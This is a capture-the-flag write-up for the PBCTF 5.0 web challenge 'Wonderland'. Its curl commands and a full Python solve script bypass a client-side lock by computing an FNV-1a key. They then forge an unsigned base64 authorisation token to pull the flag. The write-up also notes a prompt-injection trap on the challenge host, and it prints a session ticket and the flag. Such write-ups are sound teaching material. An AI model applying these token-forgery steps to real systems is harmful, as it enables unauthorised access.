---
title: "Wonderland"
ctf: "PBCTF 5.0 (Point Blank CTF)"
date: 2026-07-26
category: web
difficulty: medium
points: ?
flag_format: "pbctf{...}"
author: "vikas1337"
---

# Wonderland

## summary

big maze host where basically every path (/flag, /api/admin, /herald, hundreds of /api/v*/...) is a decoy openapi spec or a painted flag, and /herald even has a prompt-injection trap. the ONE real app is in /static/wonderland.js: card lookups keyed by FNV-1a. card 87 is 'sealed' client-side only, returns a decoy flag + a base64 writ. the writ's HMAC seal isn't enforced so u mutate court=queen grant=read, present it at /api/audience with ur ctfd ticket as a cookie, and the queen reads u the real verdict.

## how i solved it

### 1. recon: it's mostly maze + traps

```bash
B=https://104.211.98.123
curl -sk $B/api/admin
curl -sk $B/herald
```

```text
# /api/admin -> fake openapi with "x-hint": "pbctf{n3v3r_g0nna_giv3_y0u_up}" (rickroll decoy)
# /herald -> prompt-injection trap telling u to 'fuzz /api/v3/* for grant=superuser'. ignore it.
# hint said: 'one real application here; everything else is maze.'
```

### 2. the one real app: /static/wonderland.js

```javascript
function cardKey(id) {
  const PHRASE = 'we_are_all_mad_here';
  const s = PHRASE + ':' + String(id);
  let h = 2166136261 >>> 0;                 // FNV-1a offset basis
  for (let i = 0; i < s.length; i++) {
    h ^= s.charCodeAt(i);
    h = Math.imul(h, 16777619) >>> 0;
  }
  return h.toString(16).padStart(8, '0');
}
const DECK = [ {id:1,sealed:false}, ..., {id:87, sealed:true} ];
```

```text
# card 87 'The Queen's Verdict' is sealed:true -- but thats a client-side flag only.
```

### 3. compute card 87 key, server coughs it up anyway

```bash
# FNV-1a('we_are_all_mad_here:87') = de1b989f
curl -sk "$B/api/card?id=87&key=de1b989f"
```

```text
{"id":87,"suit":"spades","title":"The Queen's Verdict","body":"Off with their heads! ... This card is only her sentence, pressed and painted; the court keeps the verdict itself elsewhere ... pbctf{cli3nt_s1de_l0cks_0pen_f0r_any_gu3st}","writ":"eyJzdWJqZWN0Ijo4Nyw..."}
# body flag = PAINTED DECOY. real prize is the writ.
```

### 4. decode the writ, seal isn't enforced

```bash
echo 'eyJzdWJqZWN0Ijo4NywiZ3JhbnQiOiJ0dXJuIiwiY291cnQiOiJrbmF2ZSIsInByZXNlbnRfdG8iOiIvYXBpL2F1ZGllbmNlIiwic2VhbCI6Ii4uLiJ9' | base64 -d
```

```text
{"subject":87,"grant":"turn","court":"knave","present_to":"/api/audience","seal":"a6f591f4e1327261e5b9641aa8b85ad3"}
# GET /api/audience raw -> 403 'the court hears no one without a writ'.
# mutate court=queen: 'the Queen will not hear that plea'. court=queen+grant=read -> almost:
# 'the herald cannot announce a nameless guest ... start from the CTFd link so the court knows u by name'
```

### 5. 'by name' = the ticket cookie -> real flag

```bash
# re-encode writ {court:queen, grant:read, seal unchanged}, send with ticket cookie
W='<b64 mutated writ>'
curl -sk "$B/api/audience?writ=$W" -H 'Cookie: ticket=30.e9d1b812394b963f'
```

```text
{"subject":87,"verdict":"Sentence first - verdict afterwards, the Queen always says. And so, read at last: pbctf{f97528975ea66bbb}"}
```

## full solve script

```python
#!/usr/bin/env python3
# wonderland.py - the mad tea-party. real app is 3 hops; the rest of the host is maze.
import base64, json, urllib.parse, urllib.request, ssl

ctx = ssl.create_default_context(); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
B = 'https://104.211.98.123'
TICKET = '30.e9d1b812394b963f'   # my CTFd ticket -> goes in a 'ticket' cookie

def GET(path, cookie=None):
    h = {'Cookie': cookie} if cookie else {}
    req = urllib.request.Request(B+path, headers=h)
    return urllib.request.urlopen(req, context=ctx, timeout=15).read().decode()

# --- card key = FNV-1a("we_are_all_mad_here:"+id), straight from /static/wonderland.js
def cardKey(id):
    s = ('we_are_all_mad_here:%s' % id).encode()
    h = 2166136261
    for c in s:
        h = ((h ^ c) * 16777619) & 0xffffffff
    return '%08x' % h

# 1) card 87 is "sealed" client-side only. compute its key and the server hands it over.
key87 = cardKey(87)                       # -> de1b989f
card = json.loads(GET('/api/card?id=87&key=%s' % key87))
print('card87 body:', card['body'])       # painted decoy flag lives here
writ_b64 = card['writ']

# 2) decode the writ. seal is present but turns out NOT to be enforced server-side.
writ = json.loads(base64.urlsafe_b64decode(writ_b64 + '=='))
print('writ:', writ)                      # {grant:turn, court:knave, seal:..., present_to:/api/audience}

# 3) mutate it: court knave->queen, grant turn->read. re-encode, present at /api/audience.
#    and get 'announced by name' via the ticket cookie (that's what /herald was hinting,
#    minus the prompt-injection trap telling us to fuzz /api/v3/* for grant=superuser).
writ['court'] = 'queen'
writ['grant'] = 'read'
w = base64.urlsafe_b64encode(json.dumps(writ, separators=(',',':')).encode()).decode().rstrip('=')
out = GET('/api/audience?writ=' + urllib.parse.quote(w), cookie='ticket=' + TICKET)
print(out)
```

```text
card87 body: Off with their heads! ... pbctf{cli3nt_s1de_l0cks_0pen_f0r_any_gu3st}
writ: {'subject': 87, 'grant': 'turn', 'court': 'knave', 'present_to': '/api/audience', 'seal': 'a6f591f4e1327261e5b9641aa8b85ad3'}
{"subject":87,"verdict":"Sentence first - verdict afterwards, the Queen always says. And so, read at last: pbctf{f97528975ea66bbb}"}
```

## flag

```
pbctf{f97528975ea66bbb}
```
